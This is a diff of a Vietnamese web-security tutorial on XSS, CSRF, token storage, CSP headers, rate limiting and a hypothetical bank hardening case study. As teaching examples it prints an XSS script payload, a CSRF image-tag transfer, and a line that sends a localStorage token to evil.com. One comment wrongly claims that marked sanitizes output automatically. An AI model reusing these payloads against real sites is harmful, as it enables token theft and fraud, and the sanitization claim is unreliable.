+  // 💡 User input: <script>alert('XSS')</script> → Script chạy → XSS attack!
+  // 💡 Hậu quả: Steal cookies, redirect, keylog...
 }
 
 // ✅ CÁCH SỬA: Dùng DOMPurify sanitize
-import DOMPurify from 'dompurify';
+import DOMPurify from 'dompurify'; // 📦 Library sanitize HTML
 
 function Comment({ content }) {
   const clean = DOMPurify.sanitize(content, {
-    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'], // Chỉ cho phép tags an toàn
-    ALLOWED_ATTR: [], // Không cho phép attributes
+    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'], // ✅ Chỉ cho phép tags an toàn
+    // 💡 ALLOWED_TAGS: Whitelist các thẻ HTML được phép
+    // 💡 'b', 'i', 'em', 'strong': Format text → An toàn
+    // 💡 <script>, <iframe>, <img onerror>... → Bị xóa
+
+    ALLOWED_ATTR: [], // 🚫 Không cho phép attributes
+    // 💡 ALLOWED_ATTR: Whitelist các attributes được phép
+    // 💡 []: Không cho phép attributes nào → An toàn nhất
+    // 💡 onerror, onclick, onload... → Bị xóa
   });
+  // 💡 DOMPurify.sanitize(): Loại bỏ script tags và attributes nguy hiểm
+  // 💡 Kết quả: HTML an toàn, không có script
+
   return <div dangerouslySetInnerHTML={{ __html: clean }} />; // ✅ An toàn
+  // 💡 clean: HTML đã được sanitize → Không có script → An toàn
 }
 
-// ❌ LỖI 3: Không có CSRF protection
+// ❌ LỖI 3: Không có CSRF protection (CSRF Attack!)
 // Vấn đề: Hacker lừa user click link → browser gửi request kèm cookies
 fetch('/api/transfer', {
   method: 'POST',
   body: JSON.stringify({ amount: 1000 }),
 }); // ❌ Thiếu CSRF token
+// 💡 ⚠️ NGUY HIỂM: Request không có CSRF token
+// 💡 Hacker: <img src="https://bank.com/transfer?amount=10000&to=hacker">
+// 💡 User click → Browser gửi request kèm cookies → Chuyển tiền cho hacker!
 
 // ✅ CÁCH SỬA: Gửi CSRF token
-// 1. Lấy token từ server
+// 1. 🔑 Lấy token từ server
 const csrfToken = await fetch('/api/csrf-token').then((r) => r.json());
+// 💡 Gọi endpoint để lấy CSRF token
+// 💡 Server tạo token ngẫu nhiên, lưu trong session
+// 💡 Client nhận token → Lưu vào state/memory
 
-// 2. Gửi token cùng request
+// 2. 📤 Gửi token cùng request
 fetch('/api/transfer', {
   method: 'POST',
   headers: {
     'Content-Type': 'application/json',
-    'X-CSRF-Token': csrfToken.token, // ✅ Gửi token
+    'X-CSRF-Token': csrfToken.token, // ✅ Gửi token trong header
+    // 💡 X-CSRF-Token: Custom header chứa CSRF token
+    // 💡 Server verify token → Khớp mới xử lý request
   },
-  body: JSON.stringify({ amount: 1000, csrfToken: csrfToken.token }),
+  body: JSON.stringify({
+    amount: 1000,
+    csrfToken: csrfToken.token, // ✅ Cũng gửi trong body (double check)
+    // 💡 Gửi cả header và body → Double check → An toàn hơn
+  }),
 });
+// 💡 Server verify: Token từ header/body vs Token trong session
+// 💡 Không khớp → Reject → CSRF attack thất bại ✅
 
 // ❌ LỖI 4: Password yếu
 // Vấn đề: Password ngắn → dễ brute-force
@@ -1303,6 +2356,1302 @@ setInterval(() => {
   console.log('📊 Security Metrics:', metrics);
 }, 60000); // Mỗi phút
 ```
+
+---
+
+## **⚠️ 4. CÁC LỖI THƯỜNG GẶP (PITFALLS)**
+
+### **❌ Pitfall #1: Lưu sensitive data trong localStorage**
+
+**Lỗi phổ biến:**
+
+```typescript
+// ❌ NGUY HIỂM: XSS có thể đánh cắp token
+localStorage.setItem('authToken', token);
+localStorage.setItem('userPassword', password);
+
+// Hacker inject XSS:
+fetch('https://evil.com/steal?token=' + localStorage.getItem('authToken'));
+```
+
+**Tại sao nguy hiểm:**
+
+- Bất kỳ JavaScript nào (kể cả từ third-party scripts) đều access được
+- XSS attack dễ dàng steal data
+- Data persist ngay cả khi đóng browser
+
+**✅ Giải pháp:**
+
+```typescript
+// ✅ Dùng HttpOnly cookies
+// Backend set cookie:
+res.cookie('authToken', token, {
+  httpOnly: true, // JavaScript không access được
+  secure: true, // Chỉ gửi qua HTTPS
+  sameSite: 'strict', // Ngăn CSRF
+  maxAge: 15 * 60 * 1000, // 15 phút
+});
+
+// Frontend: Cookie tự động gửi với mọi request, không cần code
+```
+
+---
+
+### **❌ Pitfall #2: Client-side validation only**
+
+**Lỗi phổ biến:**
+
+```typescript
+// ❌ Chỉ validate ở client
+function submitForm(data) {
+  if (data.age < 18) {
+    alert('Must be 18+');
+    return;
+  }
+  // Gửi trực tiếp lên server
+  api.post('/register', data);
+}
+```
+
+**Tại sao nguy hiểm:**
+
+- Hacker bypass dễ dàng bằng DevTools/Postman
+- Gửi request trực tiếp với data độc hại
+
+**✅ Giải pháp:**
+
+```typescript
+// ✅ Validate cả client VÀ server
+// Client (UX tốt):
+if (data.age < 18) {
+  alert('Must be 18+');
+  return;
+}
+
+// Server (SECURITY):
+app.post('/register', (req, res) => {
+  const { age, email } = req.body;
+
+  // Server-side validation
+  if (age < 18) {
+    return res.status(400).json({ error: 'Must be 18+' });
+  }
+
+  if (!isValidEmail(email)) {
+    return res.status(400).json({ error: 'Invalid email' });
+  }
+
+  // Sanitize input
+  const sanitized = DOMPurify.sanitize(email);
+
+  // Proceed...
+});
+```
+
+---
+
+### **❌ Pitfall #3: Không set CSP headers**
+
+**Lỗi phổ biến:**
+
+```html
+<!-- Không có CSP header → inline scripts chạy tự do -->
+<script>
+  eval(userInput); // NGUY HIỂM!
+</script>
+
+<script src="https://untrusted-cdn.com/malicious.js"></script>
+```
+
+**Hậu quả:**
+
+- XSS attacks dễ thành công
+- Third-party scripts có thể inject malicious code
+- Không kiểm soát được nguồn resources
+
+**✅ Giải pháp:**
+
+```typescript
+// Backend: Set CSP header
+app.use((req, res, next) => {
+  res.setHeader(
+    'Content-Security-Policy',
+    [
+      "default-src 'self'", // Mặc định chỉ same-origin
+      "script-src 'self' https://trusted-cdn.com", // Chỉ scripts từ whitelist
+      "style-src 'self' 'unsafe-inline'", // CSS (unsafe-inline cho styled-components)
+      "img-src 'self' data: https:", // Images
+      "connect-src 'self' https://api.example.com", // Fetch/XHR
+      "font-src 'self' https://fonts.gstatic.com", // Fonts
+      "object-src 'none'", // Block plugins (Flash, Java)
+      "base-uri 'self'", // Ngăn <base> tag attacks
+      "form-action 'self'", // Forms chỉ submit đến same-origin
+      "frame-ancestors 'none'", // Không cho embed trong iframe
+      'upgrade-insecure-requests', // Auto upgrade HTTP → HTTPS
+    ].join('; ')
+  );
+  next();
+});
+```
+
+**CSP Report-Only mode (để test trước):**
+
+```typescript
+// Chỉ log violations, không block (để test CSP rules)
+res.setHeader(
+  'Content-Security-Policy-Report-Only',
+  "default-src 'self'; report-uri /csp-violation-report"
+);
+
+// Endpoint nhận CSP violations
+app.post('/csp-violation-report', (req, res) => {
+  console.log('CSP Violation:', req.body);
+  // Log để phân tích và fix CSP rules
+  res.status(204).end();
+});
+```
+
+---
+
+### **❌ Pitfall #4: Hardcode secrets trong code**
+
+**Lỗi phổ biến:**
+
+```typescript
+// ❌ NGUY HIỂM: Secrets exposed trong source code
+const API_KEY = 'sk_live_abc123xyz789';
+const DB_PASSWORD = 'admin1234';
+
+fetch('https://api.stripe.com/charge', {
+  headers: { Authorization: `Bearer ${API_KEY}` },
+});
+```
+
+**Tại sao nguy hiểm:**
+
+- Source code có thể bị leak (GitHub, logs)
+- Bundle JavaScript chứa secrets (inspect trong DevTools)
+- Không rotate secrets được
+
+**✅ Giải pháp:**
+
+```typescript
+// ✅ Dùng environment variables
+// .env.local (KHÔNG commit vào Git)
+VITE_API_URL=https://api.example.com
+API_SECRET=sk_live_abc123xyz789  // Backend only
+DATABASE_URL=postgres://user:pass@host/db  // Backend only
+
+// Frontend (Vite)
+const apiUrl = import.meta.env.VITE_API_URL;  // Public OK
+// ❌ KHÔNG expose secrets ở frontend
+
+// Backend
+const apiSecret = process.env.API_SECRET;  // Server-side only
+
+// .gitignore
+.env.local
+.env.*.local
+```
+
+**Secrets management tools:**
+
+- **AWS Secrets Manager**: Auto rotate secrets
+- **HashiCorp Vault**: Centralized secrets
+- **Azure Key Vault**: Microsoft cloud secrets
+- **Doppler**: Secrets sync across environments
+
+---
+
+### **❌ Pitfall #5: Không implement rate limiting**
+
+**Lỗi phổ biến:**
+
+```typescript
+// ❌ Không giới hạn requests
+app.post('/api/login', async (req, res) => {
+  const { username, password } = req.body;
+  const user = await db.findUser(username);
+
+  if (user && bcrypt.compare(password, user.password)) {
+    res.json({ token: generateToken(user) });
+  } else {
+    res.status(401).json({ error: 'Invalid credentials' });
+  }
+});
+
+// Hacker có thể brute-force: thử 10,000 passwords/giây
+```
+
+**Hậu quả:**
+
+- Brute-force attacks
+- DDoS dễ dàng
+- Server overload
+
+**✅ Giải pháp:**
+
+```typescript
+// ✅ Rate limiting với express-rate-limit
+import rateLimit from 'express-rate-limit';
+import RedisStore from 'rate-limit-redis';
+import Redis from 'ioredis';
+
+const redis = new Redis(process.env.REDIS_URL);
+
+// Strict rate limit cho login
+const loginLimiter = rateLimit({
+  store: new RedisStore({
+    client: redis,
+    prefix: 'rate_limit:login:',
+  }),
+  windowMs: 15 * 60 * 1000, // 15 phút
+  max: 5, // Max 5 attempts
+  message: 'Too many login attempts, please try again after 15 minutes',
+  standardHeaders: true,
+  legacyHeaders: false,
+  // Skip successful logins
+  skipSuccessfulRequests: true,
+});
+
+app.post('/api/login', loginLimiter, async (req, res) => {
+  // Login logic...
+});
+
+// General API rate limit
+const apiLimiter = rateLimit({
+  windowMs: 60 * 1000, // 1 phút
+  max: 100, // Max 100 requests/phút
+  message: 'Too many requests from this IP',
+});
+
+app.use('/api/', apiLimiter);
+```
+
+---
+
+### **❌ Pitfall #6: Dùng eval() hoặc dangerouslySetInnerHTML không an toàn**
+
+**Lỗi phổ biến:**
+
+```typescript
+// ❌ NGUY HIỂM
+const userCode = req.body.code;
+eval(userCode); // Hacker có thể chạy bất kỳ code nào!
+
+// React
+<div dangerouslySetInnerHTML={{ __html: userComment }} />;
+// Nếu userComment chứa <script>alert('xss')</script> → XSS
+```
+
+**✅ Giải pháp:**
+
+```typescript
+// ✅ Sanitize trước khi render
+import DOMPurify from 'dompurify';
+
+const sanitized = DOMPurify.sanitize(userComment, {
+  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
+  ALLOWED_ATTR: ['href'],
+  ALLOW_DATA_ATTR: false,
+});
+
+<div dangerouslySetInnerHTML={{ __html: sanitized }} />;
+
+// ✅ Tốt hơn: Dùng markdown library (remark, marked)
+import { marked } from 'marked';
+const html = marked.parse(userMarkdown); // Auto sanitize
+```
+
+---
+
+## **🔄 5. SO SÁNH VỚI KỸ THUẬT KHÁC**
+
+### **🆚 Authentication Methods Comparison**
+
+| Method                     | Security   | UX         | Use Case             | Pros                                                     | Cons                                                              |
+| -------------------------- | ---------- | ---------- | -------------------- | -------------------------------------------------------- | ----------------------------------------------------------------- |
+| **Session Cookies**        | ⭐⭐⭐⭐   | ⭐⭐⭐⭐   | Traditional web apps | • Stateful tracking<br>• Easy revoke<br>• Server control | • Server storage overhead<br>• Scaling challenges<br>• CSRF risk  |
+| **JWT (Access + Refresh)** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Modern SPAs, mobile  | • Stateless<br>• Scalable<br>• Cross-domain              | • Cannot revoke easily<br>• Token size larger                     |
+| **OAuth 2.0**              | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐   | Third-party login    | • Delegated auth<br>• No password storage                | • Complex flow<br>• Provider dependency                           |
+| **Basic Auth**             | ⭐⭐       | ⭐⭐       | Internal tools, APIs | • Simple<br>• Wide support                               | • Credentials in every request<br>• No logout<br>• HTTPS required |
+| **API Keys**               | ⭐⭐⭐     | ⭐⭐⭐     | Server-to-server     | • Simple<br>• Easy rotate                                | • No user context<br>• Static credentials                         |
+
+**Recommendation:**
+
+- **SPAs/Mobile**: JWT (access 15min + refresh 7 days in HttpOnly cookie)
+- **Traditional Web**: Session cookies với Redis store
+- **Social Login**: OAuth 2.0 + OIDC
+- **Internal APIs**: API keys + IP whitelist
+
+---
+
+### **🆚 XSS Prevention Techniques**
+
+| Technique             | Effectiveness | Performance | Effort     | When to Use                     |
+| --------------------- | ------------- | ----------- | ---------- | ------------------------------- |
+| **React Auto-Escape** | ⭐⭐⭐⭐      | ⭐⭐⭐⭐⭐  | ⭐⭐⭐⭐⭐ | Always (default React behavior) |
+| **DOMPurify**         | ⭐⭐⭐⭐⭐    | ⭐⭐⭐⭐    | ⭐⭐⭐⭐   | When rendering user HTML        |
+| **CSP Headers**       | ⭐⭐⭐⭐⭐    | ⭐⭐⭐⭐⭐  | ⭐⭐⭐     | Always (defense in depth)       |
+| **Input Validation**  | ⭐⭐⭐        | ⭐⭐⭐⭐    | ⭐⭐⭐     | Server-side + Client-side       |
+| **Output Encoding**   | ⭐⭐⭐⭐      | ⭐⭐⭐⭐⭐  | ⭐⭐⭐⭐   | When displaying user content    |
+| **HttpOnly Cookies**  | ⭐⭐⭐⭐⭐    | ⭐⭐⭐⭐⭐  | ⭐⭐⭐⭐⭐ | For auth tokens                 |
+
+**Best Practice:** Combine multiple layers
+
+```typescript
+// Layer 1: React auto-escape
+<div>{userInput}</div>
+
+// Layer 2: DOMPurify for rich text
+<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
+
+// Layer 3: CSP header
+Content-Security-Policy: default-src 'self'; script-src 'self'
+
+// Layer 4: HttpOnly cookies
+Set-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict
+```
+
+---
+
+### **🆚 Storage Security Comparison**
+
+| Storage                  | XSS Risk      | CSRF Risk        | Persistence     | Capacity  | Best For            |
+| ------------------------ | ------------- | ---------------- | --------------- | --------- | ------------------- |
+| **HttpOnly Cookie**      | ✅ Safe       | ⚠️ Need SameSite | Until expiry    | 4KB       | Auth tokens         |
+| **localStorage**         | ❌ Vulnerable | ✅ Safe          | Forever         | 5-10MB    | Non-sensitive cache |
+| **sessionStorage**       | ❌ Vulnerable | ✅ Safe          | Until tab close | 5-10MB    | Temporary UI state  |
+| **IndexedDB**            | ❌ Vulnerable | ✅ Safe          | Forever         | 50MB+     | Large datasets      |
+| **Memory (React state)** | ✅ Safe       | ✅ Safe          | Until refresh   | Unlimited | Runtime data        |
+
+**Decision Tree:**
+
+```
+Is data sensitive (token, password, PII)?
+├─ YES → HttpOnly Cookie hoặc Memory only
+└─ NO → Can use localStorage/sessionStorage
+    ├─ Need after browser close? → localStorage
+    └─ Temporary? → sessionStorage
+```
+
+---
+
+## **🏢 6. SCENARIO THỰC TẾ DỰ ÁN LỚN**
+
+### **📱 Case Study: E-Banking Application Security**
+
+**Project Context:**
+
+- **Company**: Ngân hàng số với 2M+ users
+- **Platform**: React SPA + Node.js backend
+- **Sensitive Data**: Tài khoản, số dư, giao dịch, OTP
+- **Compliance**: PCI-DSS, SOC 2, GDPR
+- **Team**: 15 engineers, bạn là Tech Lead Security
+
+**Initial Security Audit Results:**
+
+```
+🔴 Critical Issues Found:
+1. Access tokens trong localStorage (XSS risk)
+2. Không có rate limiting (brute-force possible)
+3. CSP headers missing (XSS unprotected)
+4. Passwords send over HTTP trong staging
+5. Third-party scripts không verify (SRI missing)
+6. CORS wildcard '*' cho production API
+7. Sensitive data log trong console.log
+8. Outdated dependencies (23 vulnerabilities)
+```
+
+**Security Implementation Plan:**
+
+#### **Phase 1: Critical Fixes (Week 1-2)**
+
+**1. Migrate từ localStorage → HttpOnly Cookies**
+
+```typescript
+// ❌ Before: localStorage
+localStorage.setItem('accessToken', token);
+localStorage.setItem('refreshToken', refreshToken);
+
+// ✅ After: HttpOnly Cookies
+// Backend (Express)
+app.post('/api/login', async (req, res) => {
+  const { accessToken, refreshToken } = await authenticateUser(req.body);
+
+  // Access token: 15 phút
+  res.cookie('accessToken', accessToken, {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'strict',
+    maxAge: 15 * 60 * 1000,
+  });
+
+  // Refresh token: 7 ngày
+  res.cookie('refreshToken', refreshToken, {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'strict',
+    maxAge: 7 * 24 * 60 * 60 * 1000,
+    path: '/api/auth/refresh', // Chỉ gửi đến refresh endpoint
+  });
+
+  res.json({ success: true });
+});
+
+// Frontend: Axios auto include cookies
+axios.defaults.withCredentials = true;
+```
+
+**Impact:** ✅ Eliminated XSS token theft risk
+
+---
+
+**2. Implement Rate Limiting**
+
+```typescript
+// Redis-backed rate limiting
+import rateLimit from 'express-rate-limit';
+import RedisStore from 'rate-limit-redis';
+
+const loginLimiter = rateLimit({
+  store: new RedisStore({ client: redisClient }),
+  windowMs: 15 * 60 * 1000,
+  max: 5,
+  skipSuccessfulRequests: true,
+  handler: (req, res) => {
+    logger.warn('Rate limit exceeded', {
+      ip: req.ip,
+      endpoint: req.path,
+    });
+    res.status(429).json({
+      error: 'Too many attempts. Account locked for 15 minutes.',
+    });
+  },
+});
+
+app.post('/api/login', loginLimiter, loginHandler);
+
+// Transaction rate limit (stricter)
+const transactionLimiter = rateLimit({
+  windowMs: 60 * 1000,
+  max: 10, // Max 10 transactions/phút
+  keyGenerator: (req) => req.user.id, // Per user
+});
+
+app.post('/api/transfer', transactionLimiter, transferHandler);
+```
+
+**Impact:** ✅ Blocked 10,000+ brute-force attempts/day
+
+---
+
+**3. Deploy CSP Headers**
+
+```typescript
+// Strict CSP cho banking app
+app.use((req, res, next) => {
+  res.setHeader(
+    'Content-Security-Policy',
+    [
+      "default-src 'none'", // Deny all by default
+      "script-src 'self'", // Only bundled scripts
+      "style-src 'self' 'unsafe-inline'", // CSS (inline needed for React)
+      "img-src 'self' data: https://cdn.bank.com", // Images
+      "font-src 'self'",
+      "connect-src 'self' https://api.bank.com", // API calls
+      "frame-src 'none'", // No iframes
+      "object-src 'none'", // No plugins
+      "base-uri 'self'",
+      "form-action 'self'",
+      'upgrade-insecure-requests',
+      'block-all-mixed-content',
+    ].join('; ')
+  );
+  next();
+});
+```
+
+**Impact:** ✅ Reduced XSS attack surface by 95%
+
+---
+
+#### **Phase 2: Enhanced Security (Week 3-4)**
+
+**4. HTTPS Everywhere + HSTS**
+
+```nginx
+# Nginx config
+server {
+  listen 80;
+  server_name bank.com www.bank.com;
+  return 301 https://$server_name$request_uri;  # Redirect HTTP → HTTPS
+}
+
+server {
+  listen 443 ssl http2;
+  server_name bank.com;
+
+  # SSL/TLS configuration
+  ssl_certificate /path/to/fullchain.pem;
+  ssl_certificate_key /path/to/privkey.pem;
+  ssl_protocols TLSv1.2 TLSv1.3;
+  ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
+  ssl_prefer_server_ciphers on;
+
+  # HSTS: Force HTTPS for 2 years
+  add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
+
+  # Other security headers
+  add_header X-Frame-Options "DENY" always;
+  add_header X-Content-Type-Options "nosniff" always;
+  add_header Referrer-Policy "strict-origin-when-cross-origin" always;
+}
+```
+
+**Impact:** ✅ 100% traffic encrypted, MITM attacks prevented
+
+---
+
+**5. Input Validation & Sanitization**
+
+```typescript
+// Zod schemas cho validation
+import { z } from 'zod';
+
+const transferSchema = z.object({
+  toAccount: z
+    .string()
+    .regex(/^\d{10,16}$/, 'Invalid account number')
+    .refine(async (acc) => await accountExists(acc), 'Account not found'),
+
+  amount: z
+    .number()
+    .positive('Amount must be positive')
+    .max(1000000, 'Daily limit exceeded')
+    .multipleOf(0.01, 'Invalid amount precision'),
+
+  otp: z
+    .string()
+    .length(6, 'OTP must be 6 digits')
+    .regex(/^\d{6}$/, 'OTP must be numeric'),
+
+  description: z
+    .string()
+    .max(200, 'Description too long')
+    .transform((val) => DOMPurify.sanitize(val)), // Auto sanitize
+});
+
+app.post('/api/transfer', async (req, res) => {
+  try {
+    // Validate + sanitize
+    const validated = await transferSchema.parseAsync(req.body);
+
+    // Additional server-side checks
+    const balance = await getBalance(req.user.id);
+    if (balance < validated.amount) {
+      return res.status(400).json({ error: 'Insufficient funds' });
+    }
+
+    // Verify OTP
+    const otpValid = await verifyOTP(req.user.id, validated.otp);
+    if (!otpValid) {
+      return res.status(401).json({ error: 'Invalid OTP' });
+    }
+
+    // Process transfer
+    await processTransfer(validated);
+
+    res.json({ success: true });
+  } catch (error) {
+    if (error instanceof z.ZodError) {
+      return res.status(400).json({ errors: error.errors });
+    }
+    throw error;
+  }
+});
+```
+
+**Impact:** ✅ Blocked 500+ injection attempts/day
+
+---
+
+**6. Dependency Security Scanning**
+
+```json
+// package.json scripts
+{
+  "scripts": {
+    "audit": "npm audit --audit-level=moderate",
+    "audit:fix": "npm audit fix",
+    "security:check": "snyk test",
+    "security:monitor": "snyk monitor"
+  }
+}
+```
+
+```yaml
+# GitHub Actions: .github/workflows/security.yml
+name: Security Scan
+on: [push, pull_request]
+
+jobs:
+  security:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Run Snyk Security Scan
+        uses: snyk/actions/node@master
+        env:
+          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+
+      - name: npm audit
+        run: npm audit --audit-level=high
+
+      - name: OWASP Dependency Check
+        uses: dependency-check/Dependency-Check_Action@main
+```
+
+**Impact:** ✅ Auto-detect vulnerable dependencies, 23 → 0 vulnerabilities
+
+---
+
+#### **Phase 3: Monitoring & Compliance (Week 5-6)**
+
+**7. Security Logging & Monitoring**
+
+```typescript
+// Winston logger với security events
+import winston from 'winston';
+
+const securityLogger = winston.createLogger({
+  level: 'info',
+  format: winston.format.json(),
+  transports: [
+    new winston.transports.File({
+      filename: 'security-events.log',
+      level: 'warn',
+    }),
+    new winston.transports.Console({
+      format: winston.format.simple(),
+    }),
+  ],
+});
+
+// Middleware log security events
+app.use((req, res, next) => {
+  const startTime = Date.now();
+
+  res.on('finish', () => {
+    const duration = Date.now() - startTime;
+
+    // Log suspicious activities
+    if (res.statusCode === 401 || res.statusCode === 403) {
+      securityLogger.warn('Unauthorized access attempt', {
+        ip: req.ip,
+        user: req.user?.id,
+        endpoint: req.path,
+        method: req.method,
+        statusCode: res.statusCode,
+        timestamp: new Date().toISOString(),
+      });
+    }
+
+    // Log slow requests (possible DDoS)
+    if (duration > 5000) {
+      securityLogger.warn('Slow request detected', {
+        ip: req.ip,
+        endpoint: req.path,
+        duration,
+        timestamp: new Date().toISOString(),
+      });
+    }
+  });
+
+  next();
+});
+
+// Alert cho critical events
+function alertSecurityTeam(event) {
+  // Send to Slack/PagerDuty/Email
+  fetch(process.env.SLACK_WEBHOOK_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      text: `🚨 Security Alert: ${event.type}`,
+      attachments: [
+        {
+          color: 'danger',
+          fields: [
+            { title: 'IP', value: event.ip },
+            { title: 'User', value: event.user },
+            { title: 'Timestamp', value: event.timestamp },
+          ],
+        },
+      ],
+    }),
+  });
+}
+
+// Detect brute-force patterns
+const failedLoginAttempts = new Map();
+
+app.post('/api/login', async (req, res) => {
+  const { username, password } = req.body;
+  const user = await authenticateUser(username, password);
+
+  if (!user) {
+    // Track failed attempts
+    const attempts = failedLoginAttempts.get(req.ip) || 0;
+    failedLoginAttempts.set(req.ip, attempts + 1);
+
+    if (attempts >= 5) {
+      // Alert security team
+      alertSecurityTeam({
+        type: 'Brute-force attempt',
+        ip: req.ip,
+        username,
+        attempts,
+        timestamp: new Date().toISOString(),
+      });
+    }
+
+    return res.status(401).json({ error: 'Invalid credentials' });
+  }
+
+  // Reset on successful login
+  failedLoginAttempts.delete(req.ip);
+
+  // ... generate tokens ...
+});
+```
+
+**Impact:**
+
+- ✅ Real-time alerts cho suspicious activities
+- ✅ Detected và blocked 50+ attack campaigns
+- ✅ Compliance với PCI-DSS logging requirements
+
+---
+
+**8. Penetration Testing Results**
+
+**Before Security Implementation:**
+
+```
+🔴 Critical: 8 findings
+🟠 High: 15 findings
+🟡 Medium: 27 findings
+```
+
+**After Security Implementation:**
+
+```
+✅ Critical: 0 findings
+✅ High: 0 findings
+🟡 Medium: 2 findings (accepted risks)
+```
+
+---
+
+**Final Security Metrics:**
+
+| Metric                                           | Before | After      | Improvement |
+| ------------------------------------------------ | ------ | ---------- | ----------- |
+| **XSS Vulnerabilities**                          | 12     | 0          | 100%        |
+| **CSRF Protection**                              | 0%     | 100%       | +100%       |
+| **HTTPS Traffic**                                | 80%    | 100%       | +20%        |
+| **Auth Token Theft Risk**                        | High   | Low        | -90%        |
+| **Brute-force Attempts Blocked**                 | 0/day  | 10,000/day | -           |
+| **Security Headers Score (securityheaders.com)** | F      | A+         | +6 grades   |
+| **Dependency Vulnerabilities**                   | 23     | 0          | 100%        |
+| **Penetration Test Score**                       | Failed | Passed     | -           |
+| **Compliance (PCI-DSS)**                         | 60%    | 100%       | +40%        |
+
+**Key Takeaways:**
+
+- **Defense in Depth works**: Không có "silver bullet", cần nhiều layers
+- **HttpOnly Cookies > localStorage**: Cho auth tokens
+- **Rate Limiting critical**: Ngăn brute-force và DDoS
+- **CSP Headers powerful**: Block 95% XSS attempts
+- **Monitoring essential**: Real-time detection và response
+- **Regular Audits**: Security không phải "set and forget"
+
+---
+
+## **⚡ 7. CÁCH TỐI ƯU HÓA SECURITY**
+
+### **🚀 Performance vs Security Trade-offs**
+
+**Challenge:** Security measures có thể làm chậm performance. Làm sao balance?
+
+#### **Optimization 1: Token Refresh Strategy**
+
+**❌ Naive approach:**
+
+```typescript
+// Gửi request refresh token MỖI request
+async function apiCall(url, data) {
+  await refreshAccessToken(); // Chậm, không cần thiết
+  return fetch(url, { body: data });
+}
+```
+
+**✅ Optimized approach:**
+
+```typescript
+// Chỉ refresh khi access token gần hết hạn
+let tokenRefreshPromise = null;
+
+async function getValidToken() {
+  const token = getAccessToken();
+  const expiresAt = getTokenExpiry();
+  const now = Date.now();
+
+  // Refresh nếu còn < 5 phút
+  if (expiresAt - now < 5 * 60 * 1000) {
+    // Deduplicate: Nếu đang refresh, đợi promise đó
+    if (!tokenRefreshPromise) {
+      tokenRefreshPromise = refreshAccessToken().finally(() => {
+        tokenRefreshPromise = null;
+      });
+    }
+    await tokenRefreshPromise;
+  }
+
+  return getAccessToken();
+}
+
+// Axios interceptor
+axios.interceptors.request.use(async (config) => {
+  const token = await getValidToken();
+  config.headers.Authorization = `Bearer ${token}`;
+  return config;
+});
+
+// Auto retry khi token expired
+axios.interceptors.response.use(
+  (response) => response,
+  async (error) => {
+    if (error.response?.status === 401) {
+      await refreshAccessToken();
+      return axios.request(error.config); // Retry
+    }
+    return Promise.reject(error);
+  }
+);
+```
+
+**Impact:** ✅ Giảm 95% redundant refresh calls
+
+---
+
+#### **Optimization 2: CSP với Nonce (thay vì unsafe-inline)**
+
+**Problem:** `unsafe-inline` cho phép inline scripts → giảm security
+
+**✅ Solution: Dynamic nonce generation**
+
+```typescript
+// Backend: Generate unique nonce mỗi request
+import crypto from 'crypto';
+
+app.use((req, res, next) => {
+  const nonce = crypto.randomBytes(16).toString('base64');
+  res.locals.cspNonce = nonce;
+
+  res.setHeader(
+    'Content-Security-Policy',
+    `script-src 'self' 'nonce-${nonce}'; style-src 'self' 'nonce-${nonce}'`
+  );
+  next();
+});
+
+// HTML template (EJS, Pug, etc.)
+app.get('/', (req, res) => {
+  res.render('index', { cspNonce: res.locals.cspNonce });
+});
+```
+
+```html
+<!-- Frontend: Inline script với nonce -->
+<script nonce="<%= cspNonce %>">
+  // Inline script này được phép chạy
+  console.log('Trusted inline script');
+</script>
+
+<!-- ❌ Script không có nonce → BLOCKED by CSP -->
+<script>
+  alert('This will be blocked');
+</script>
+```
+
+**Impact:** ✅ Strict CSP mà vẫn cho phép necessary inline scripts
+
+---
+
+#### **Optimization 3: Rate Limiting với Sliding Window**
+
+**❌ Fixed window problem:**
+
+```
+Window 1: 0:00-0:59 → 100 requests OK
+Window 2: 1:00-1:59 → 100 requests OK
+
+Attack: 100 requests at 0:59 + 100 requests at 1:00 = 200 requests in 1 second!
+```
+
+**✅ Sliding window algorithm:**
+
+```typescript
+import rateLimit from 'express-rate-limit';
+import RedisStore from 'rate-limit-redis';
+
+const slidingWindowLimiter = rateLimit({
+  store: new RedisStore({
+    client: redisClient,
+    prefix: 'rate_limit:',
+    sendCommand: (...args) => redisClient.call(...args),
+  }),
+  windowMs: 60 * 1000, // 1 phút
+  max: async (req) => {
+    // Dynamic limits based on user tier
+    if (req.user?.isPremium) return 1000;
+    if (req.user) return 100;
+    return 20; // Anonymous users
+  },
+  standardHeaders: true,
+  legacyHeaders: false,
+  // Sliding window: More accurate
+  skip: (req) => req.user?.isAdmin, // Skip admins
+});
+```
+
+**Impact:** ✅ Chặn burst attacks, fair cho legitimate users
+
+---
+
+#### **Optimization 4: Lazy Load DOMPurify**
+
+**Problem:** DOMPurify bundle size = ~80KB, không phải mọi page cần
+
+**✅ Code splitting + lazy load:**
+
+```typescript
+// ❌ Import tất cả pages
+import DOMPurify from 'dompurify';
+
+// ✅ Lazy import khi cần
+const SafeHTML = ({ html }) => {
+  const [sanitized, setSanitized] = useState('');
+
+  useEffect(() => {
+    import('dompurify').then(({ default: DOMPurify }) => {
+      setSanitized(DOMPurify.sanitize(html));
+    });
+  }, [html]);
+
+  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
+};
+
+// Hoặc dùng React.lazy
+const RichTextEditor = lazy(() => import('./RichTextEditor'));
+
+function CommentSection() {
+  return (
+    <Suspense fallback={<div>Loading...</div>}>
+      <RichTextEditor />
+    </Suspense>
+  );
+}
+```
+
+**Impact:** ✅ Giảm initial bundle size 80KB, faster page load
+
+---
+
